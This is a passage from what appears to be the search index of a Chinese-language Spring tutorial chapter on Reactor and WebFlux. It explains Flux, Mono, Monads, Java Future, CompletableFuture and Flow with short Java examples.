\u8fc7\u7a0b\u3002 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u5b8c\u6210\u8fd9\u4e2a Nomad \u7684\u8fc7\u7a0b\u3002 class NomadOfRoot { private final Double value; private final boolean isNegative; public NomadOfRoot(Double value) { this.value = value; this.isNegative = value < 0; } public NomadOfRoot root() { if (isNegative || value == null) { return new NomadOfRoot(null); } else { return new NomadOfRoot((Double) Math.sqrt(value)); } } public NomaOfRoot add(NomadOfRoot other) { if (value == null || other.value == null) { return new NomadOfRoot(null); } else { return new NomadOfRoot(value + other.value); } } public Double getValue() { return value; } } Double result = ( new NomadOfRoot(1.0) .add(new NomadOfRoot(2.0).root()) .root() .add(new NomadOfRoot(-3.0)) .root() .getValue() ); \u8fd9\u6837\u5b50\uff0c\u5982\u679c\u6211\u4eec\u7684\u6240\u6709\u63a5\u53e3\u90fd\u8fd4\u56de NomadOfRoot\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e0d\u7528\u518d\u505a\u989d\u5916\u7684\u68c0\u67e5\u4e86\uff0c\u56e0\u4e3a NomadOfRoot \u4f1a\u81ea\u52a8\u68c0\u67e5\u5e76\u8fd4\u56de\u6b63\u786e\u7684\u503c\u3002 \u76ee\u524d\u6211\u4eec\u7684\u64cd\u4f5c\u8fd8\u5f88\u5c11\u3002\u4f46\u662f\u5982\u679c\u8981\u94fe\u5f0f\u8c03\u7528\u51e0\u5341\u4e2a\u65b9\u6cd5\u5462\uff1f\u8fd9\u65f6\u5019 Monad \u5c31\u663e\u5f97\u5f88\u65b9\u4fbf\u4e86\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u4e2d\u7684 Monad \u54cd\u5e94\u5f0f\u7f16\u7a0b\u672c\u8d28\u5c31\u662f\u5c06\u6570\u636e\u5305\u88c5\u6210\u5f02\u6b65 Monad\uff0c\u8fd9\u4e2a Monad \u8981\u4e48\u5904\u4e8e Pending \u9636\u6bb5\uff0c\u6ca1\u6709\u6c42\u503c\uff1b\u8981\u4e48\u5df2\u7ecf\u5b8c\u6210\uff0c\u7136\u540e\u5bf9\u8fd9\u4e2a Monad \u8fdb\u884c\u64cd\u4f5c\u3002\u8fd9\u4e2a\u64cd\u4f5c\u662f\u4e00\u4e2a\u7ba1\u7ebf\uff0c\u5b83\u662f\u4e00\u4e2a\u94fe\u5f0f\u7684\u64cd\u4f5c\uff0c\u6bcf\u4e2a\u64cd\u4f5c\u90fd\u662f\u4e00\u4e2a Monad\uff0c\u8fd9\u4e2a Monad \u4f1a\u5728\u6570\u636e\u5230\u8fbe\u7684\u65f6\u5019\u8fdb\u884c\u64cd\u4f5c\u3002 \u5728 Reactor \u4e2d\uff0c\u8fd9\u4e2a Monad \u662f Flux \u7c7b\uff0cMono \u5219\u662f Flux \u7684\u7279\u4f8b\u3002\u5bf9\u6bd4\u4e0a\u9762\u5bf9 Monad \u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5217\u51fa Flux \u7684\u4e09\u4e2a\u8981\u7d20\uff1a \u7c7b\u578b\u6784\u9020\u5668\uff1a\u4f7f\u7528 Flux.just \u6765\u6784\u9020\u4e00\u4e2a Flux\u3002\u4f46\u6ce8\u610f\uff0cFlux \u4fdd\u5b58\u7684\u662f\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u503c\uff0c\u56e0\u6b64\uff0c\u4f8b\u5982 Flux<Integer> \uff0c\u53ef\u4ee5\u4fdd\u5b58\u591a\u4e2a Integer\uff0c\u8981\u8fd9\u6837\u5199 Flux.just(1, 2, 3) \u3002 unit\uff1a\u8981\u628a Flux \u5bf9\u8c61\u53d8\u6210\u666e\u901a\u7684\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528 block \u65b9\u6cd5\uff0c\u4f8b\u5982 Flux.just(1).blockFirst() \u3002 bind\uff1aFlux \u7684 bind \u662f map \uff0c flatMap \uff0c filter \u7b49\u65b9\u6cd5\u3002 \u800c Mono \u7c7b\u662f\u4e00\u79cd\u7279\u6b8a\u7684 Flux\uff0c\u5b83\u53ea\u80fd\u4fdd\u5b58\u4e00\u4e2a\u503c\u3002\u663e\u7136\uff0cFlux \u53ef\u4ee5\u88ab\u62c6\u6210\u5f88\u591a\u4e2a Mono\uff0c\u800c Mono \u4e5f\u53ef\u4ee5\u88ab\u5408\u5e76\u6210\u4e00\u4e2a Flux\u3002\u524d\u8005\u4f7f\u7528 next \u65b9\u6cd5\uff0c\u540e\u8005\u4f7f\u7528 concat \u65b9\u6cd5\u3002 Publisher\uff0c Subscribe \u4e0e Pipe Publisher \u4e0e Subscriber \u662f Reactor \u7684\u4e24\u4e2a\u6838\u5fc3\u63a5\u53e3\u3002Publisher \u662f\u4e00\u4e2a\u751f\u4ea7\u8005\uff0c\u5b83\u53ef\u4ee5\u751f\u4ea7\u6570\u636e\u3002Subscriber \u662f\u4e00\u4e2a\u6d88\u8d39\u8005\uff0c\u5b83\u53ef\u4ee5\u6d88\u8d39\u6570\u636e\u3002\u7b80\u5355\u7684\u6765\u8bf4\uff0cPublisher \u5fc5\u987b\u4ea7\u751f Flux\uff0c\u800c Subscriber \u5fc5\u987b\u6d88\u8d39 Flux\u3002 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u662f\u4e00\u4e2a Publisher\uff0c Flux<Integer> publisher = Flux.just(1, 2, 3); \u800c\u4e0b\u9762\u7684\u4ee3\u7801\u662f\u4e00\u4e2a Subscriber\uff0c publisher.subscribe(System.out::println); \u5f53\u7136\uff0c\u628a\u6240\u6709\u6570\u636e\u53d6\u51fa\u6765\u4e5f\u7b97\u662f\u4e00\u79cd\u6d88\u8d39\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528 block \u65b9\u6cd5\u3002 publisher.blockLast(); \u800c\u6570\u636e\u4e4b\u95f4\u7684\u8f6c\u6362\uff0c\u5219\u662f\u901a\u8fc7\u7ba1\u7ebf\u65b9\u6cd5\uff08Pipe\uff09\u6765\u5b9e\u73b0\u7684\u3002\u5177\u4f53\u800c\u8a00\uff0c map \u65b9\u6cd5\u662f\u6700\u5e38\u7528\u7684 Pipe \u65b9\u6cd5\uff0c\u5b83\u53ef\u4ee5\u5bf9\u6570\u636e\u8fdb\u884c\u8f6c\u6362\u3002\u4f8b\u5982\uff0c Flux<Integer> publisher = Flux.just(1, 2, 3); List<Integer> l = publisher.map(i -> i * 2).collectList().block(); \u7efc\u4e0a\uff0c\u4e00\u4e2a\u5b8c\u6574\u7684\u7ba1\u7ebf\u5c31\u662f\uff0cpublisher \u4ece\u4e00\u822c\u7684\u6570\u636e\u8f6c\u6362\u6210 Flux\uff0c\u82e5\u5e72 Pipe \u65b9\u6cd5\u5bf9\u6570\u636e\u8fdb\u884c\u8f6c\u6362\uff0c\u4ece Flux \u8f6c\u6210 Flux\uff0c\u6700\u540e\u901a\u8fc7 subscribe\u65b9\u6cd5\u6d88\u8d39\u6570\u636e\u3002 \u5e38\u7528\u7684\u5185\u5efa Publisher \u6709\uff0c Flux.just \uff1a\u5c06\u4e00\u4e2a\u6216\u82e5\u5e72\u4e2a\u5143\u7d20\u8f6c\u6362\u6210 Flux\u3002 Flux.fromArray \uff1a\u5c06\u4e00\u4e2a\u6570\u7ec4\u8f6c\u6362\u6210 Flux\u3002 Flux.fromIterable \uff1a\u5c06\u4e00\u4e2a Iterable \u8f6c\u6362\u6210 Flux\u3002 Flux.fromStream \uff1a\u5c06\u4e00\u4e2a Stream \u8f6c\u6362\u6210 Flux\u3002 Flux.range \uff1a\u5c06\u4e00\u4e2a\u8303\u56f4\u5185\u7684\u6574\u6570\u8f6c\u6362\u6210 Flux\u3002 Mono.just \uff1a\u5c06\u4e00\u4e2a\u5143\u7d20\u8f6c\u6362\u6210 Mono\u3002 Mono.empty \uff1a\u5c06\u4e00\u4e2a\u7a7a\u503c\u8f6c\u6362\u6210 Mono\u3002 Mono.error \uff1a\u5c06\u4e00\u4e2a\u9519\u8bef\u8f6c\u6362\u6210 Mono\u3002 \u5e38\u7528\u7684 Pipe \u65b9\u6cd5\u6709\uff0c flux.map(func) \uff1a\u5bf9 Flux \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u5c06\u8fd4\u56de\u503c\u6536\u96c6\u6210\u65b0\u7684 Flux\u3002 flux.flatMap(func) \uff1a\u5bf9 Flux \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u51fd\u6570\u5e94\u5f53\u8fd4\u56de\u4e00\u4e2a\u5143\u7d20\u5217\u8868\uff0c\u6700\u540e\u4f1a\u628a\u6bcf\u4e2a\u5143\u7d20\u5217\u8868\u8fde\u63a5\u6210\u4e00\u4e2a\u65b0\u7684 Flux\u3002 flux.filter(func) \uff1a\u5bf9 Flux \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u51fd\u6570\u5e94\u5f53\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u6700\u540e\u4f1a\u628a\u6240\u6709\u8fd4\u56de true \u7684\u5143\u7d20\u6536\u96c6\u6210\u65b0\u7684 Flux\u3002 flux.collectList() \uff1a\u5c06 Flux \u4e2d\u7684\u6240\u6709\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a\u5217\u8868\u7684 Mono\u3002\u5373 Flux<T> \u53d8\u6210 Mono<List<T>> \u3002 flux.first() \uff1a\u5c06 Flux \u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a Mono\u3002 flux.last() \uff1a\u5c06 Flux \u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a Mono\u3002 flux.index(index) \uff1a\u5c06 Flux \u4e2d\u7684\u7b2c index \u4e2a\u5143\u7d20\u6536\u96c6\u6210\u4e00\u4e2a Mono\u3002 mono.map(func) \uff1a\u5bf9 Mono \u4e2d\u7684\u5143\u7d20\uff0c\u6267\u884c\u51fd\u6570\uff0c\u5c06\u8fd4\u56de\u503c\u6536\u96c6\u6210\u65b0\u7684 Mono\u3002 \u5e38\u7528\u7684 Subscribe \u65b9\u6cd5\u6709\uff0c flux.subscribe() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u4f46\u662f\u4e0d\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 flux.subscribe(func) \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u5bf9\u6bcf\u4e2a\u5143\u7d20\u6267\u884c\u51fd\u6570\u3002 flux.blockLast() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u53d6\u51fa\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 flux.blockFirst() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002 flux.block() \uff1a\u8ba2\u9605\u4e00\u4e2a Flux\uff0c\u53d6\u51fa\u6240\u6709\u5143\u7d20\u3002 mono.block() \uff1a\u8ba2\u9605\u4e00\u4e2a Mono\uff0c\u53d6\u51fa\u5143\u7d20\u3002 mono.subscribe() \uff1a\u8ba2\u9605\u4e00\u4e2a Mono\uff0c\u4f46\u662f\u4e0d\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 mono.subscribe(func) \uff1a\u8ba2\u9605\u4e00\u4e2a Mono\uff0c\u5bf9\u5143\u7d20\u6267\u884c\u51fd\u6570\u3002 \u6ce8\u610f\uff0c\u4e0a\u9762\u7684\u6240\u6709\u65b9\u6cd5\u53ea\u662f\u58f0\u660e\u7ba1\u7ebf\uff0c\u5e76\u4e0d\u4f1a\u771f\u6b63\u6267\u884c\u7ba1\u7ebf\u3002\u53ea\u6709 Subscribe \u65b9\u6cd5\u624d\u4f1a\u771f\u6b63\u6267\u884c\u7ba1\u7ebf\u3002\u6267\u884c\u65f6\uff0c\u5404\u4e2a\u5143\u7d20\u662f\u5f02\u6b65\u6267\u884c\u7684\u3002 \u6b64\u5916\uff0cSubscribe \u65b9\u6cd5\u4e0d\u80fd\u5d4c\u5957\u3002\u4e00\u65e6\u6570\u503c\u8fdb\u5165\u4e86 Monad\uff0c\u53ea\u80fd\u4f7f\u7528 Pipe \u65b9\u6cd5\u8fdb\u884c\u5904\u7406\u3002\u4f8b\u5982\uff0c\u5728 Webflux \u4e2d\uff0c\u6846\u67b6\u4f1a\u81ea\u52a8\u4e3a\u4f60 Subscibe Monad\uff0c\u56e0\u6b64\u4e0d\u80fd\u5728\u4ee3\u7801\u4e2d\u4f7f\u7528 Subscribe \u65b9\u6cd5\uff0c\u5904\u7406\u65f6\u5fc5\u987b\u4f7f\u7528\u54cd\u5e94\u5f0f\u8bed\u6cd5\u3002","title":"Reactor \u6846\u67b6"},{"location":"12/#spring-ch12-reactor","text":"Spring Cloud \u5fae\u670d\u52a1\u7684\u5185\u5bb9\u544a\u4e00\u6bb5\u843d\u3002\u5728 Spring Cloud \u90e8\u5206\uff0c\u6211\u4eec\u5b66\u4e60\u4e86\u4f7f\u7528 Consul\uff0cLoad Balancer\uff0cSpring Interface Client \u4e0e OpenFeign\uff0cResilience4j\uff0cMicroMeter\uff0cGateway\uff0cSeata\u3002\u8fd9\u662f\u73b0\u5728 Spring Cloud \u5b98\u65b9\u6700\u63a8\u8350\u7684\u4e00\u5957\u7ec4\u4ef6\u3002\u8bda\u7136\uff0c\u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u7ec4\u4ef6\u4e5f\u5f88\u91cd\u8981\uff0c\u4e3b\u8981\u662f Spring Cloud Alibaba \u7684\u7ec4\u4ef6\uff0cNacos \u4e0e Sentinel\uff0cSeata \u4e5f\u5c5e\u4e8e Spring Cloud Alibaba \u7684\u7ec4\u4ef6\uff0c\u4f46\u662f\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u5b83\u3002Nacos \u548c Sentinel \u7684\u4f7f\u7528\u65b9\u6cd5\u4e0e Consul \u548c Resilience4j \u7c7b\u4f3c\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u518d\u4ecb\u7ecd\uff0c\u6709\u4e86\u524d\u9762\u7684\u57fa\u7840\uff0c\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5b66\u4e60\u5b83\u4eec\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u5c06\u5b66\u4e60\u4e00\u4e9b Spring \u7684\u9ad8\u7ea7\u5185\u5bb9\uff0c\u4e4b\u540e\u518d\u56de\u5230\u5fae\u670d\u52a1\uff0c\u5b66\u4e60\u57fa\u4e8e kubernetes \u7684\u5fae\u670d\u52a1\u3002 \u8fd9\u4e9b\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\uff0c WebFlux\uff0c\u5f02\u6b65\u7684 Spring Web Spring Security\uff0cSpring \u5b89\u5168\u6846\u67b6\uff1bKeyCloak\uff0cOIDC \u8ba4\u8bc1\u670d\u52a1\u5668 \u6d88\u606f\u961f\u5217\uff0cRabbit MQ \u975e HTTP \u534f\u8bae\uff0c\u5305\u62ec graphQL \u548c RPC\uff0cRPC \u5c06\u57fa\u4e8e gRPC \u8fdb\u884c\u4ecb\u7ecd \u9996\u5148\uff0c\u6211\u4eec\u5b66\u4e60 WebFlux\u3002Spring \u6846\u67b6\u6211\u4eec\u4e4b\u524d\u5df2\u7ecf\u5b66\u8fc7\uff0c\u56e0\u6b64\u6211\u4eec\u91cd\u70b9\u5b66\u4e60 Reactor\uff0c\u5b83\u662f WebFlux \u7684\u57fa\u7840\u3002","title":"Spring \u901f\u6210 Ch12 Reactor"},{"location":"12/#webflux","text":"\u524d\u9762\u6211\u4eec\u8bb2\u8fc7\uff0cSpring \u81ea\u5df1\u662f\u4e00\u4e2a\u57fa\u4e8e Bean \u7684\u6846\u67b6\u3002\u800c Spring Web \u662f\u6211\u4eec\u5b9e\u9645\u5f00\u53d1 Web \u7a0b\u5e8f\u4f7f\u7528\u7684\u6846\u67b6\uff0c\u5b83\u662f\u4e2a\u57fa\u4e8e Servlet \u548c Spring \u7684\u6846\u67b6\uff0c\u5b83\u6709\u81ea\u5df1\u7684 Spring Boot Starter\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u4f7f\u7528\u3002 \u5176\u5b9e\uff0cSpring Web \u7684\u5168\u540d\u662f Spring Web MVC\uff0c\u4f46 MVC \u5df2\u7ecf\u6ca1\u4eba\u5173\u5fc3\u4e86\u3002 \u4f46\u662f\uff0c\u4e0e Spring Web \u5e76\u884c\u7684\u8fd8\u6709\u4e00\u5957\u6846\u67b6\uff0c\u53eb\u505a Spring WebFlux\u3002Spring WebFlux \u662f\u4e00\u4e2a\u57fa\u4e8e Reactor \u7684\u6846\u67b6\uff0c\u5b83\u662f\u4e00\u4e2a\u5f02\u6b65\u7684\u6846\u67b6\uff0c\u53ef\u4ee5\u7528\u4e8e\u6784\u5efa\u54cd\u5e94\u5f0f\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u4e5f\u662f\u57fa\u4e8e Spring \u5bb9\u5668\uff0c\u4f46\u662f\u5b83\u7684\u5f02\u6b65\u5f15\u64ce\u662f Reactor\uff0c\u800c\u670d\u52a1\u5668\u662f Netty\u3002Reactor \u4e3a WebFlux \u63d0\u4f9b\u4e86\u5f02\u6b65\u7684\u80fd\u529b\uff0cNetty \u4e3a WebFlux \u63d0\u4f9b\u4e86\u5f02\u6b65\u7684\u670d\u52a1\u5668\u3002 \u76f8\u6bd4\u4e8e Spring Web\uff0cSpring WebFlux \u6709\u66f4\u9ad8\u7684\u5e76\u53d1\u80fd\u529b\u3002\u7136\u800c\uff0c\u7531\u4e8e WebFlux \u8f83\u4e3a\u5e74\u8f7b\uff0cSpring \u7684\u6574\u4e2a\u751f\u6001\u90fd\u662f\u56f4\u7ed5 Spring Web \u7684\uff0c\u6240\u4ee5 Spring WebFlux \u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e9b\u4e0d\u517c\u5bb9\u95ee\u9898\uff0c\u4f46\u5e76\u4e0d\u4e25\u91cd\u3002\u4f46\u6574\u4f53\u800c\u8a00\uff0c\u5750\u62e5\u6574\u4e2a Spring \u751f\u6001\u7684 Spring WebFlux \u662f\u4e00\u4e2a\u5f88\u6709\u524d\u9014\u7684\u6846\u67b6\u3002","title":"WebFlux \u7b80\u4ecb"},{"location":"12/#java","text":"\u6211\u4eec\u5148\u770b\u4e3a\u4ec0\u4e48\u8981\u5f15\u5165 Reactor\u3002 Java \u5728 8 \u4e4b\u540e\u5f15\u5165\u4e86 Future\uff0c\u4f46\u662f Future \u8bbe\u8ba1\u7684\u592a\u5dee\u4e86\uff0c\u4ee5\u81f3\u4e8e\u4f60\u5fc5\u987b\u624b\u52a8\u5b9e\u73b0 EventLoop\uff0c\u4f8b\u5982\uff0c ExecutorService executor = Executors.newFixedThreadPool(1); Future<Integer> future = executor.submit(() -> { Thread.sleep(1000); return 1; }); while (!future.isDone()) { System.out.println(\"Waiting...\"); Thread.sleep(100); } System.out.println(future.get()); \u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u7cdf\u7cd5\u7684\u8bbe\u8ba1\u56e0\u6b64\uff0cJava \u5728 8 \u4e4b\u540e\u5f15\u5165\u4e86 CompletableFuture\uff0c\u5b83\u6bd4 Future \u597d\u7528\u591a\u4e86\uff0c\u4f8b\u5982\uff0c CompletableFuture<Integer> future = CompletableFuture.supplyAsync(() -> { try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } return 1; }); future.thenAccept(System.out::println); \u663e\u7136\uff0c\u8fd9\u4e2a\u5df2\u7ecf\u5f88\u50cf\u5176\u5b83\u8bed\u8a00\u7684 Promise \u4e86\u3002\u4f46\u662f\u5f88\u53ef\u60dc\uff0cJava \u81f3\u4eca\u8fd8\u6ca1\u6709\u5f15\u5165 async-await\uff0c\u56e0\u6b64\u7ecf\u5178\u7684\u56de\u8c03\u5730\u72f1\u8fd8\u662f\u4f1a\u51fa\u73b0\u3002 \u4e0d\u8fc7\uff0c\u56de\u8c03\u5730\u72f1\u4e0d\u53ea\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u9664\u4e86\u5927\u90e8\u5206\u8bed\u8a00\u91c7\u7528\u7684 async-await\uff0c\u8fd8\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u5c31\u662f\u54cd\u5e94\u5f0f\u7f16\u7a0b\uff0c\u8fd9\u5c31\u662f Reactor\u3002 \u4e0d\u8fc7\uff0cJava \u5728\u540e\u7eed\u7684 Java 9 \u4e4b\u540e\u5f15\u5165\u4e86 Flow\uff0c\u5b83\u8bbe\u8ba1\u7684\u548c Reactor \u7c7b\u4f3c\u3002\u5177\u4f53\u800c\u8a00\uff0c\u5b83\u7684\u6548\u679c\u662f\uff0c Flow.Publisher<Integer> publisher = subscriber -> { subscriber.onNext(1); subscriber.onComplete(); }; Flow.Subscriber<Integer> subscriber = new Flow.Subscriber<>() { @Override public void onSubscribe(Flow.Subscription subscription) { subscription.request(1); } @Override public void onNext(Integer item) { System.out.println(item); } @Override public void onError(Throwable throwable) { throwable.printStackTrace(); } @Override public void onComplete() { System.out.println(\"Complete\"); } }; publisher.subscribe(subscriber); \u591a\u5c11\u6709\u70b9\u592a\u5570\u55e6\u4e86\u3002\u800c Reactor \u5229\u7528\u51fd\u6570\u5f0f\u7f16\u7a0b\u7684\u7279\u6027\uff0c\u53ef\u4ee5\u66f4\u7b80\u5355\u7684\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u50cf\u662f\uff0c Flux.just(1).subscribe(System.out::println); \u8981\u7b80\u5355\u5f97\u591a\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5c3d\u7ba1\u6709\u4e86 Flow\uff0c\u4f46\u662f Reactor \u4ecd\u7136\u6709\u5e02\u573a\u3002","title":"Java \u6807\u51c6\u5e93\u5f02\u6b65\u7f16\u7a0b"},{"location":"12/#_1","text":"\u54cd\u5e94\u5f0f\u7f16\u7a0b\u672c\u8d28\u5c31\u662f\u7ecf\u5178\u7684\u6d41\u5f0f\u7f16\u7a0b\uff0c\u4f46\u662f\u5b83\u4e0e\u4f20\u7edf\u7684\u6d41\u5f0f\u7f16\u7a0b\u6709\u4e00\u4e9b\u4e0d\u540c\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u662f\u5f02\u6b65\u7684\uff0c\u800c\u4e0d\u662f\u540c\u6b65\u7684\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5728\u7b49\u5f85\u4e00\u4e2a\u64cd\u4f5c\u5b8c\u6210\u7684\u65f6\u5019\u505a\u5176\u5b83\u4e8b\u60c5\u3002\u800c\u5728\u6d41\u5f0f\u7f16\u7a0b\u4e2d\uff0c\u672c\u8d28\u53ea\u662f\u4e00\u4e2a\u5faa\u73af\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u662f\u57fa\u4e8e\u4e8b\u4ef6\u7684\uff0c\u800c\u4e0d\u662f\u57fa\u4e8e\u6570\u636e\u7684\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5728\u6570\u636e\u5230\u8fbe\u7684\u65f6\u5019\u5904\u7406\u6570\u636e\uff0c\u800c\u4e0d\u662f\u7b49\u5f85\u6570\u636e\u5230\u8fbe\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u662f\u60f0\u6027\u7684\uff0c\u800c\u4e0d\u662f\u53ca\u65f6\u7684\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5728\u9700\u8981\u7684\u65f6\u5019\u624d\u5904\u7406\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4e00\u6b21\u6027\u5904\u7406\u6240\u6709\u6570\u636e\u3002 \u54cd\u5e94\u5f0f\u7f16\u7a0b\u6709\u4e24\u4e2a\u6838\u5fc3\u6982\u5ff5\uff0c\u4e00\u4e2a\u662f Publisher\uff0c\u4e00\u4e2a\u662f Subscriber\u3002\u4e24\u8005\u5728 Reactor \u4e2d\u90fd\u662f Mono \u548c Flux\uff0c\u800c\u8fd9\u4e24\u4e2a\u4e1c\u897f\u672c\u8d28\u4e0a\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u4e2d\u7684 Monad\u3002 \u4e0b\u9762\u5173\u4e8e Monad \u7684\u5185\u5bb9\uff0c\u5982\u679c\u4e0d\u7406\u89e3\u53ef\u4ee5\u8df3\u8fc7\uff0c\u4e0d\u5f71\u54cd\u5de5\u7a0b\u4e0a\u7684\u77e5\u8bc6\u548c\u4f7f\u7528\u3002","title":"\u54cd\u5e94\u5f0f\u7f16\u7a0b\u7684\u6838\u5fc3\u6982\u5ff5"},{"location":"12/#monad","text":"Monad \u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u4e2d\u7684\u4e00\u4e2a\u6982\u5ff5\u3002\u5c3d\u7ba1\u6709\u4e9b\u6559\u7a0b\u5199\u7684\u5f88\u590d\u6742\uff0c\u4f46\u662f\u5176\u5b9e\u5f88\u7b80\u5355\u3002Monad \u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u6620\u5c04\u3002\u6211\u4eec\u7528\u4e24\u4e2a\u7a7a\u95f4\u6765\u8be0\u91ca Monad\uff0c\u771f\u503c\u7a7a\u95f4\u548c\u50cf\u7a7a\u95f4\u3002\u771f\u503c\u7a7a\u95f4\u662f\u6211\u4eec\u719f\u6089\u7684\u7a7a\u95f4\uff0c\u5b83\u5305\u542b\u4e86\u6240\u6709\u7684\u771f\u503c\u3002\u800c\u50cf\u7a7a\u95f4\u662f Monad \u7684\u7a7a\u95f4\uff0c\u5b83\u5305\u542b\u4e86 Monad \u7684\u503c\u3002 Monad \u662f\u4e00\u4e2a\u5305\u542b\u4e09\u4e2a\u5173\u952e\u8981\u7d20\u7684\u7ed3\u6784\uff1a \u7c7b\u578b\u6784\u9020\u5668\uff08Type Constructor\uff09\uff1a\u5c06\u666e\u901a\u7684\u503c\uff08\u771f\u503c\uff09\u6620\u5c04\u5230\u50cf\u7a7a\u95f4\u4e2d\u3002\u8fd9\u7c7b\u4f3c\u4e8e\u5728 Java \u4e2d\u7684\u6cdb\u578b\u7c7b\u578b\uff0c\u5982 Optional<T> \uff0c\u5b83\u5c06\u4e00\u4e2a\u503c\u5305\u88f9\u5728\u4e00\u4e2a\u5bb9\u5668\u5185\u3002\u7c7b\u578b\u6784\u9020\u5668\u672c\u8d28\u4e0a\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b0\u7684\u6570\u636e\u7c7b\u578b\uff0c\u8fd9\u4e2a\u7c7b\u578b\u5305\u542b\u4e86\u539f\u59cb\u503c\u53ca\u5176\u9644\u52a0\u7684\u8ba1\u7b97\u4e0a\u4e0b\u6587\u3002 unit\uff08\u4e5f\u79f0\u4e3a return \u6216 pure\uff09\uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u771f\u503c\u7a7a\u95f4\u4e2d\u7684\u5143\u7d20\u8f6c\u6362\u4e3a\u50cf\u7a7a\u95f4\u4e2d\u7684 Monad\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b83\u5c06\u666e\u901a\u7684\u503c\u653e\u5165 Monad \u4e2d\u3002\u4f8b\u5982\uff0c\u5728 Optional \u4e2d\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 Optional.of \u6765\u5c06\u4e00\u4e2a\u503c\u653e\u5165 Optional Monad \u4e2d\u3002 bind\uff08\u4e5f\u79f0\u4e3a flatMap\uff0c\u6216 >>= \uff09\uff1a\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u5bf9\u50cf\u7a7a\u95f4\u4e2d\u7684 Monad \u8fdb\u884c\u64cd\u4f5c\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0cMonad \u5148\u628a\u67d0\u4e2a\u503c\u6253\u5305\uff0c\u7136\u540e\u5bf9\u8fd9\u4e2a\u6253\u5305\u597d\u7684\u503c\u8fdb\u884c\u8fd0\u7b97\uff0c\u7136\u540e\u518d\u53d6\u51fa\u6765\u3002\u8fd9\u4e2a\u6253\u5305\u597d\u7684\u503c\u5c31\u662f\u50cf\u7a7a\u95f4\u4e2d\u7684 Monad\u3002 \u8fd9\u79cd\u64cd\u4f5c\u770b\u8d77\u6765\u53ef\u80fd\u6ca1\u6709\u4ec0\u4e48\u610f\u4e49\uff0c\u4f46\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u53ef\u80fd\u4f1a\u8ba9\u4f60\u660e\u767d\u5b83\u7684\u65b9\u4fbf\u4e4b\u5904\u3002\u5373\u6709\u65f6\u5019\uff0c\u771f\u503c\u7a7a\u95f4\u5185\u7684\u8fd0\u7b97\u53ef\u80fd\u6ca1\u6709\u5168\u5c40\u7684\u7b97\u5b50\uff0c\u5373\u6ca1\u6709\u5168\u5c40\u7684\u51fd\u6570\u6765\u5904\u7406\u6240\u6709\u60c5\u51b5\u3002\u8fd8\u4f7f\u7528 Optional 